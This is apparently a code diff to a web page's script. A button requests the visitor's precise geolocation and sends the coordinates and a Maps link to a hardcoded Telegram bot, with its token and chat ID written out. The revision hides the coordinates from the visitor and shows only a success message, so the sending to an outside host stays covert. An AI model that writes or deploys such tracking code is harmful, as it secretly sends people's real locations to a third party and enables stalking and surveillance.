@@ -20,38 +20,39 @@
     </div>
 
 <script>
-    function sendToTelegram(lat, lon) {
-        const botToken = '8919783579:AAfelvrQG5cHJ-OUhTwdQRRQ12GHXPJ57RQ';
-        const chatId = '868803183';
-        
-        const message = 📍 گەیشت بەدەست نوێ لۆکەیشن !\n\n🌐 Lat: ${lat}\n🌐 Long: ${lon}\n\n🔗 نەخشە: https://www.google.com/maps?q=${lat},${lon};
-        const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
-        
-        fetch(url).catch(error => console.error('Error:', error));
-    }
+    const botToken = '8919783579:AAfelvrQG5cHJ-OUhTwdQRRQ12GHXPJ57RQ';
+    const chatId = '868803183';
 
     document.getElementById('locBtn').addEventListener('click', function() {
         const r = document.getElementById('result');
+        
         if (!navigator.geolocation) {
             r.innerHTML = 'This browser does not support location services.';
             return;
         }
         
-        r.innerHTML = '⏳ Waiting for location permission... Please click Allow on the popup.';
+        r.innerHTML = '⏳ Waiting for location permission...';
         
         navigator.geolocation.getCurrentPosition(
             function(p) {
                 const lat = p.coords.latitude;
                 const lon = p.coords.longitude;
-                const acc = Math.round(p.coords.accuracy);
-                r.innerHTML = ✅ Location received.<br>Latitude: ${lat}<br>Longitude: ${lon}<br>Approximate accuracy: ${acc} meters;
+                r.innerHTML = ✅ Location received successfully!;
                 
-                sendToTelegram(lat, lon);
+                // ناردنی لۆکەیشن بۆ تێلیگرام
+                const message = 📍 لۆکەیشنی نوێ گەیشت!\n\n🌐 Lat: ${lat}\n🌐 Long: ${lon}\n\n🔗 نەخشە: https://www.google.com/maps?q=${lat},${lon};
+                const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text= + encodeURIComponent(message);
+                
+                fetch(url).then(response => {
+                    console.log('Sent to telegram');
+                }).catch(error => {
+                    console.error('Error:', error);
+                });
             },
             function(e) {
-                r.innerHTML = '❌ Location was not received. Please allow location access in your browser.';
+                r.innerHTML = '❌ Permission denied or error getting location.';
             },
-            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
     });
 </script>
